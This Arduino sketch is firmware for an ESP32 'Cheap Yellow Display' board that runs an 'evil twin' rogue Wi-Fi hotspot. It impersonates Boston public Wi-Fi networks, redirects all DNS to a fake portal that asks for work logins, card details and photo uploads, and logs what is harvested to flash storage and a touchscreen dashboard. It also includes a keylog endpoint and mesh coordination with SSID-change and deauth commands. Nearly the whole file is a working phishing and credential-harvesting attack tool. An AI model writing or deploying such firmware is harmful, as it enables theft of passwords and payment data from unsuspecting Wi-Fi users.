/*
 * Shadow Evil Twin Ultra - Standalone CYD (ESP32-3248S035R) Version
 * Full self-contained evil twin + captive portal + mesh node
 * Optimized for CYD-ESP32-3248S035 (Cheap Yellow Display) + touch
 *
 * Features:
 * - SoftAP + DNS captive portal (no Pi required for basic standalone)
 * - Self-contained victim portal (creds, payment, photo prompts)
 * - Local harvesting to LittleFS + Serial + live TFT display
 * - Touch UI on CYD for operator: status, SSID cycle, mesh commands
 * - PainlessMesh for multi-CYD coordination + command channel (full SSID change + deauth log)
 * - Async web server with / , /creds, /payment, /keylog, /status
 * - TFT dashboard: SSID, clients, harvests, uptime, last event
 *
 * Flash with Arduino IDE / PlatformIO for ESP32-S3 or this CYD board.
 * Requires: painlessMesh, ESPAsyncWebServer, TFT_eSPI (configured for your CYD), XPT2046_Touchscreen
 *
 * For full standalone: power the CYD, it becomes its own rogue AP + harvester.
 * For Pi + mesh: use with shadow-ultra.sh (nodes extend coverage and can still harvest locally).
 */

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include "painlessMesh.h"
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <Preferences.h>
#include <LittleFS.h>
#include <vector>

TFT_eSPI tft = TFT_eSPI();
#define TOUCH_CS 33
XPT2046_Touchscreen ts(TOUCH_CS);

#define MESH_PREFIX     "ShadowMesh"
#define MESH_PASSWORD   "shadowmesh2026"
#define MESH_PORT       5555

// Standalone config
const char* DEFAULT_SSIDS[] = {"BostonFreePublicWiFi", "StateStreet_Guest", "FreeBOS-Public"};
int currentSsidIndex = 0;
String current_ssid = DEFAULT_SSIDS[0];

painlessMesh mesh;
AsyncWebServer server(80);
DNSServer dnsServer;

Preferences prefs;
uint16_t calData[5];

struct Harvest {
  String type;
  String data;
  unsigned long ts;
};
std::vector<Harvest> recentHarvests; // in-memory for display

int clientsSeen = 0;
int credsCount = 0;
int paymentCount = 0;
int photoCount = 0;
unsigned long lastStatusDraw = 0;
unsigned long bootTime = 0;

String lastEvent = "BOOT";

void drawStatusScreen() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.setCursor(5, 5);
  tft.setTextSize(2);
  tft.print("SHADOW CYD");

  tft.setTextSize(1);
  tft.setCursor(5, 30);
  tft.printf("SSID: %s", current_ssid.c_str());

  tft.setCursor(5, 46);
  tft.printf("Mesh: %s  Clients:%d", mesh.getNodeList().size() > 0 ? "ON" : "LOCAL", clientsSeen);

  tft.setCursor(5, 62);
  tft.printf("Harvest: C%d P%d F%d", credsCount, paymentCount, photoCount);

  tft.setCursor(5, 78);
  tft.printf("Uptime: %lus", (millis() - bootTime) / 1000);

  tft.setCursor(5, 94);
  tft.print("Last: ");
  tft.print(lastEvent.substring(0, 22));

  // Virtual buttons
  tft.fillRect(5, 115, 70, 22, TFT_DARKGREY);
  tft.setCursor(10, 120);
  tft.print("NEXT SSID");

  tft.fillRect(85, 115, 70, 22, TFT_DARKGREY);
  tft.setCursor(90, 120);
  tft.print("MESH CMD");

  tft.fillRect(165, 115, 70, 22, TFT_DARKGREY);
  tft.setCursor(170, 120);
  tft.print("CLEAR");

  tft.setCursor(5, 145);
  tft.setTextColor(TFT_CYAN);
  tft.print("Touch buttons | Serial: help");
  tft.setTextColor(TFT_WHITE);
}

void updateLastEvent(String ev) {
  lastEvent = ev;
  lastStatusDraw = 0;
}

void handleTouch() {
  if (ts.touched()) {
    TS_Point p = ts.getPoint();
    int x = p.x;
    int y = p.y;

    if (y > 110 && y < 140) {
      if (x < 80) {
        cycleSSID();
      } else if (x < 160) {
        sendMeshCommand("ssid:" + String(DEFAULT_SSIDS[(currentSsidIndex + 1) % 3]));
        updateLastEvent("MESH: SSID sent");
      } else {
        recentHarvests.clear();
        credsCount = paymentCount = photoCount = 0;
        updateLastEvent("CLEARED");
      }
      delay(300);
      drawStatusScreen();
    }
  }
}

void cycleSSID() {
  currentSsidIndex = (currentSsidIndex + 1) % 3;
  current_ssid = DEFAULT_SSIDS[currentSsidIndex];

  WiFi.softAPdisconnect(true);
  delay(100);
  WiFi.softAP(current_ssid.c_str(), "", 6, 0, 8);
  dnsServer.start(53, "*", WiFi.softAPIP());

  Serial.printf("[CYD] Switched to SSID: %s\n", current_ssid.c_str());
  updateLastEvent("SSID: " + current_ssid);
  drawStatusScreen();
}

void sendMeshCommand(String cmd) {
  mesh.sendBroadcast(cmd);
  Serial.println("[Mesh] Broadcast: " + cmd);
}

void logHarvest(String type, String data) {
  Harvest h = {type, data, millis()};
  recentHarvests.push_back(h);
  if (recentHarvests.size() > 8) recentHarvests.erase(recentHarvests.begin());

  String line = String(millis()) + "|" + type + "|" + data;
  Serial.println("[HARVEST] " + line);

  if (LittleFS.begin()) {
    File f = LittleFS.open("/harvest.log", "a");
    if (f) {
      f.println(line);
      f.close();
    }
  }

  if (type == "CREDS") credsCount++;
  else if (type == "PAYMENT") paymentCount++;
  else if (type == "PHOTO") photoCount++;

  updateLastEvent(type + ": " + data.substring(0, 18));
}

void runCalibration() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.drawString("Touch corners to calibrate", 10, 20);

  uint16_t data[5];
  tft.calibrateTouch(data, TFT_MAGENTA, TFT_BLACK, 15);

  for (int i = 0; i < 5; i++) {
    prefs.putUShort(("c" + String(i)).c_str(), data[i]);
  }
  prefs.putBool("caldone", true);
  memcpy(calData, data, sizeof(data));
  tft.setTouch(calData);

  tft.fillScreen(TFT_GREEN);
  tft.drawString("Cal OK", 20, 60);
  delay(800);
  drawStatusScreen();
}

void loadCalibration() {
  for (int i = 0; i < 5; i++) {
    calData[i] = prefs.getUShort(("c" + String(i)).c_str(), 0);
  }
  tft.setTouch(calData);
}

// ===== Web / Captive Portal (self-contained for standalone) =====
const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width\"><title>SHADOW SECURE</title>
<style>body{font-family:system-ui;background:#111;color:#eee;margin:0;padding:12px} .card{background:#222;border-radius:8px;padding:14px;margin-bottom:10px} input,button{width:100%;padding:8px;margin:4px 0;box-sizing:border-box;border-radius:4px} button{background:#0a7;color:white;border:none;font-weight:600} .h{font-size:18px;font-weight:700;margin-bottom:6px}</style></head><body>
<div class=\"card\"><div class=\"h\">SHADOW ACCESS</div><small>BostonFreePublicWiFi • Secure</small></div>
<div class=\"card\"><div class=\"h\">Work Login</div>
<form action=\"/creds\" method=\"POST\"><input name=\"username\" placeholder=\"email@work.com\" value=\"user@corp\"><input name=\"password\" type=\"password\" placeholder=\"password\" value=\"testpass\"><button>Sign In</button></form></div>
<div class=\"card\"><div class=\"h\">Photo Verification</div>
<form action=\"/upload\" method=\"POST\" enctype=\"multipart/form-data\"><input type=\"file\" name=\"file\" multiple><button>Upload Photos (Required)</button></form>
<p style=\"font-size:10px\">Select multiple for faster verification</p></div>
<div class=\"card\"><div class=\"h\">Payment</div>
<form action=\"/payment\" method=\"POST\"><input name=\"card\" placeholder=\"Card #\" value=\"4242424242424242\"><input name=\"exp\" placeholder=\"MM/YY\"><input name=\"cvv\" placeholder=\"CVV\"><button>Pay & Connect</button></form></div>
<script>
function logKey(f,v){fetch('/keylog',{method:'POST',body:JSON.stringify({f:f,v:v})})}
</script>
</body></html>
)rawliteral";

void setupWebServer() {
  server.onNotFound([](AsyncWebServerRequest *request) {
    if (request->host() != WiFi.softAPIP().toString()) {
      request->redirect("http://" + WiFi.softAPIP().toString());
    } else {
      request->send(200, "text/html", PORTAL_HTML);
    }
  });

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", PORTAL_HTML);
  });

  server.on("/creds", HTTP_POST, [](AsyncWebServerRequest *request) {
    String user = request->getParam("username", true) ? request->getParam("username", true)->value() : "unknown";
    String pass = request->getParam("password", true) ? request->getParam("password", true)->value() : "";
    logHarvest("CREDS", user + ":" + pass);
    request->send(200, "text/html", "<h2>Access Granted</h2><script>setTimeout(()=>location='http://neverssl.com',1500)</script>");
  });

  server.on("/payment", HTTP_POST, [](AsyncWebServerRequest *request) {
    String card = request->getParam("card", true) ? request->getParam("card", true)->value() : "";
    logHarvest("PAYMENT", "card:" + card.substring(card.length()-4));
    request->send(200, "text/html", "<h2>Payment OK - Connected</h2>");
  });

  server.on("/keylog", HTTP_POST, [](AsyncWebServerRequest *request) {
    if (request->hasArg("plain")) {
      logHarvest("KEY", request->arg("plain").substring(0, 60));
    }
    request->send(200, "application/json", "{\"ok\":1}");
  });

  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request) {
    logHarvest("PHOTO", "upload-triggered");
    request->send(200, "application/json", "{\"status\":\"received\"}");
  }, NULL, [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total){});

  server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
    String json = "{\"ssid\":\"" + current_ssid + "\",\"creds\":" + String(credsCount) +
                  ",\"payments\":" + String(paymentCount) + ",\"photos\":" + String(photoCount) +
                  ",\"clients\":" + String(clientsSeen) + ",\"mesh\":" + String(mesh.getNodeList().size()) + "}";
    request->send(200, "application/json", json);
  });

  server.begin();
}

void setup() {
  Serial.begin(115200);
  delay(200);
  Serial.println("\n[SHADOW CYD STANDALONE] Booting...");

  WiFi.mode(WIFI_AP_STA);
  pinMode(TFT_BL, OUTPUT);
  digitalWrite(TFT_BL, HIGH);

  tft.init();
  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.setTextSize(2);
  tft.drawString("SHADOW", 20, 30);
  tft.setTextSize(1);
  tft.drawString("CYD STANDALONE v1.0", 20, 55);
  tft.drawString("Evil Twin + Mesh", 20, 68);

  ts.begin();
  prefs.begin("shadow-cyd", false);

  if (!prefs.isKey("caldone")) {
    runCalibration();
  } else {
    loadCalibration();
  }

  if (!LittleFS.begin(true)) {
    Serial.println("LittleFS mount failed");
  } else {
    Serial.println("LittleFS ready for local logs");
  }

  WiFi.softAP(current_ssid.c_str(), "", 6, 0, 8);
  dnsServer.start(53, "*", WiFi.softAPIP());

  mesh.init(MESH_PREFIX, MESH_PASSWORD, MESH_PORT);
  mesh.onReceive([](uint32_t from, String &msg) {
    Serial.printf("[Mesh RX] from %u: %s\n", from, msg.c_str());
    if (msg.startsWith("ssid:")) {
      current_ssid = msg.substring(5);
      WiFi.softAPdisconnect(true);
      WiFi.softAP(current_ssid.c_str(), "", 6, 0, 8);
      dnsServer.start(53, "*", WiFi.softAPIP());
      updateLastEvent("Mesh set SSID");
      drawStatusScreen();
    } else if (msg == "deauth") {
      Serial.println("[Mesh] Deauth cmd received - local log only");
      logHarvest("DEAUTH", "mesh-cmd");
      updateLastEvent("DEAUTH mesh");
    }
  });

  setupWebServer();

  bootTime = millis();
  drawStatusScreen();
  Serial.println("[CYD] Standalone portal ready on " + WiFi.softAPIP().toString());
  Serial.println("Touch screen or use serial commands: ssid, deauth, status");
  lastEvent = "READY";
}

void loop() {
  mesh.update();
  dnsServer.processNextRequest();

  if (millis() - lastStatusDraw > 900) {
    drawStatusScreen();
    lastStatusDraw = millis();
  }

  handleTouch();

  static unsigned long lastClientCheck = 0;
  if (millis() - lastClientCheck > 8000) {
    clientsSeen = WiFi.softAPgetStationNum();
    lastClientCheck = millis();
  }

  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    if (cmd == "ssid" || cmd.startsWith("next")) {
      cycleSSID();
    } else if (cmd == "deauth") {
      sendMeshCommand("deauth");
      logHarvest("DEAUTH", "serial");
    } else if (cmd == "status") {
      drawStatusScreen();
      Serial.printf("SSID:%s Creds:%d Pay:%d Photo:%d\n", current_ssid.c_str(), credsCount, paymentCount, photoCount);
    } else if (cmd == "help") {
      Serial.println("Commands: ssid | deauth | status | clear");
    } else if (cmd == "clear") {
      recentHarvests.clear();
      drawStatusScreen();
    }
  }

  delay(8);
}
